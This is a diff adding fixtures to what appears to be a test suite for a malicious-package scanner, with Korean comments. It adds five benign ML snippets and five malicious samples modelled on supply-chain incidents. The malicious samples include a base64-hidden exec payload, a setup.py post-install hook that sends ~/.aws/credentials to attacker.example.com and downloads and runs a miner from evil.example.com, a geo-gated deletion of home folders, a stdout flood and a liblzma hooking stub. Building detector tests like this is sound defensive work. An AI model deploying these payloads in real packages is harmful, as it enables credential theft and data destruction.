@@ -957,6 +957,206 @@ def t_test(a, b):
     return stats.ttest_ind(a, b, equal_var=False)
 '''},
     ),
+    # ─── 사이클 7: 악성 5 — 실제 incident 기반 ──────────────
+    _mal(
+        "event-stream-style-flatmap",
+        description="event-stream 2018 스타일 — flatmap-stream 의존성 추가 + base64",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="실제: event-stream incident 패턴 (npm)",
+        files={"index.py": '''
+import base64, requests
+# 의도된 정상 함수 — 그러나 이 안에 base64 디코드 후 exec
+HIDDEN = "aW1wb3J0IHJlcXVlc3RzCnJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXR0YWNrZXIuZXhhbXBsZS5jb20vJyk="
+
+def map_stream(data):
+    payload = base64.b64decode(HIDDEN).decode()
+    exec(payload, {"requests": requests})
+    return [x for x in data]
+'''},
+    ),
+    _mal(
+        "ua-parser-style-postinstall",
+        description="ua-parser-js 2021 — postinstall 에서 cred + miner 다운로드",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="실제: ua-parser-js incident 패턴",
+        files={"setup.py": '''
+from setuptools import setup
+from setuptools.command.install import install
+import os, subprocess
+
+class PostInstall(install):
+    def run(self):
+        install.run(self)
+        # creds 수집
+        try:
+            with open(os.path.expanduser("~/.aws/credentials")) as f:
+                subprocess.run(["curl", "-X", "POST", "-d", f.read(),
+                                "https://attacker.example.com/c"])
+        except Exception:
+            pass
+        # miner 다운+실행
+        subprocess.Popen(
+            ["bash", "-c",
+             "wget -q http://evil.example.com/miner -O /tmp/.x && "
+             "chmod +x /tmp/.x && /tmp/.x &"],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+
+setup(cmdclass={"install": PostInstall})
+'''},
+    ),
+    _mal(
+        "colors-style-infinite-output",
+        description="colors.js 2022 — 무한 stdout flood (자기파괴)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="실제: colors / faker 자살 폭탄",
+        files={"sabotage.py": '''
+import sys
+# 무한 출력 — CI/터미널 마비
+while True:
+    sys.stdout.write("LIBERTY LIBERTY LIBERTY ")
+    sys.stdout.flush()
+'''},
+    ),
+    _mal(
+        "node-ipc-style-geo-bomb",
+        description="node-ipc 2022 — 특정 국가 IP 에서만 파일 wipe",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="실제: node-ipc protestware",
+        files={"check.py": '''
+import requests, os, shutil
+geo = requests.get("https://ipinfo.io/json").json()
+if geo.get("country") in ("RU", "BY"):
+    home = os.path.expanduser("~")
+    for d in ("Documents", "Desktop", "Pictures"):
+        try:
+            shutil.rmtree(os.path.join(home, d))
+        except Exception:
+            pass
+'''},
+    ),
+    _mal(
+        "xz-style-gated-payload",
+        description="xz-utils 2024 스타일 — 환경 검사 후 native lib 후킹",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="실제: xz utils backdoor 변형 (정적 검출 가능 영역만)",
+        files={"hook.py": '''
+import os, ctypes
+# 특정 환경에서만 발화: linux + sshd 프로세스 컨텍스트
+if os.uname().sysname == "Linux" and "sshd" in os.environ.get("_", ""):
+    lib = ctypes.CDLL("/usr/lib/x86_64-linux-gnu/liblzma.so.5")
+    # 후킹된 함수 호출 — RSA 우회 페이로드 (시뮬레이션)
+    if hasattr(lib, "lzma_crc64"):
+        lib.lzma_crc64(b"backdoor-trigger", 16, 0)
+'''},
+    ),
+    # ─── 사이클 7: 정상 5 (ML 도메인) ─────────────────────
+    _ben(
+        "torch-model-train",
+        description="PyTorch 모델 학습 루프 (정상)",
+        files={"train.py": '''
+"""Standard PyTorch training loop."""
+import torch
+import torch.nn as nn
+
+class MLP(nn.Module):
+    def __init__(self, in_dim, hidden, out_dim):
+        super().__init__()
+        self.net = nn.Sequential(
+            nn.Linear(in_dim, hidden), nn.ReLU(),
+            nn.Linear(hidden, out_dim),
+        )
+
+    def forward(self, x):
+        return self.net(x)
+
+def train(model, loader, epochs=10, lr=1e-3):
+    opt = torch.optim.Adam(model.parameters(), lr=lr)
+    crit = nn.CrossEntropyLoss()
+    for _ in range(epochs):
+        for x, y in loader:
+            opt.zero_grad()
+            loss = crit(model(x), y)
+            loss.backward()
+            opt.step()
+'''},
+    ),
+    _ben(
+        "sklearn-pipeline",
+        description="scikit-learn Pipeline / ColumnTransformer",
+        files={"pipe.py": '''
+"""sklearn pipeline assembly."""
+from sklearn.pipeline import Pipeline
+from sklearn.compose import ColumnTransformer
+from sklearn.preprocessing import StandardScaler, OneHotEncoder
+from sklearn.linear_model import LogisticRegression
+
+def build_pipeline(numeric_cols, categorical_cols):
+    pre = ColumnTransformer([
+        ("num", StandardScaler(), numeric_cols),
+        ("cat", OneHotEncoder(handle_unknown="ignore"), categorical_cols),
+    ])
+    return Pipeline([
+        ("pre", pre),
+        ("clf", LogisticRegression(max_iter=1000)),
+    ])
+'''},
+    ),
+    _ben(
+        "pandas-dataframe-ops",
+        description="pandas DataFrame 변환",
+        files={"df_ops.py": '''
+"""DataFrame helpers."""
+import pandas as pd
+
+def normalize_columns(df: pd.DataFrame) -> pd.DataFrame:
+    return df.rename(columns=lambda c: c.strip().lower().replace(" ", "_"))
+
+def fill_numeric_na(df: pd.DataFrame, value=0) -> pd.DataFrame:
+    nums = df.select_dtypes(include="number").columns
+    return df.fillna({c: value for c in nums})
+
+def merge_with(df: pd.DataFrame, other: pd.DataFrame, on: str):
+    return df.merge(other, on=on, how="left")
+'''},
+    ),
+    _ben(
+        "transformers-tokenizer",
+        description="HuggingFace tokenizer 사용 (정상 추론)",
+        files={"infer.py": '''
+"""Transformers inference helper."""
+from transformers import AutoTokenizer, AutoModelForSequenceClassification
+import torch
+
+def classify(text: str, model_name: str = "bert-base-uncased"):
+    tok = AutoTokenizer.from_pretrained(model_name)
+    model = AutoModelForSequenceClassification.from_pretrained(model_name)
+    inputs = tok(text, return_tensors="pt", truncation=True)
+    with torch.no_grad():
+        logits = model(**inputs).logits
+    return torch.softmax(logits, dim=-1).tolist()
+'''},
+    ),
+    _ben(
+        "matplotlib-plot",
+        description="matplotlib 차트 (정상 시각화)",
+        files={"plot.py": '''
+"""Matplotlib chart helpers."""
+import matplotlib.pyplot as plt
+
+def histogram(data, bins=30, title=""):
+    fig, ax = plt.subplots()
+    ax.hist(data, bins=bins)
+    ax.set_title(title)
+    return fig
+
+def line_chart(x, y, label=""):
+    fig, ax = plt.subplots()
+    ax.plot(x, y, label=label)
+    ax.legend()
+    return fig
+'''},
+    ),
     # ─── 정상 fixture 추가 10 ───────────────────────────────
     _ben(
         "fastapi-style-app",
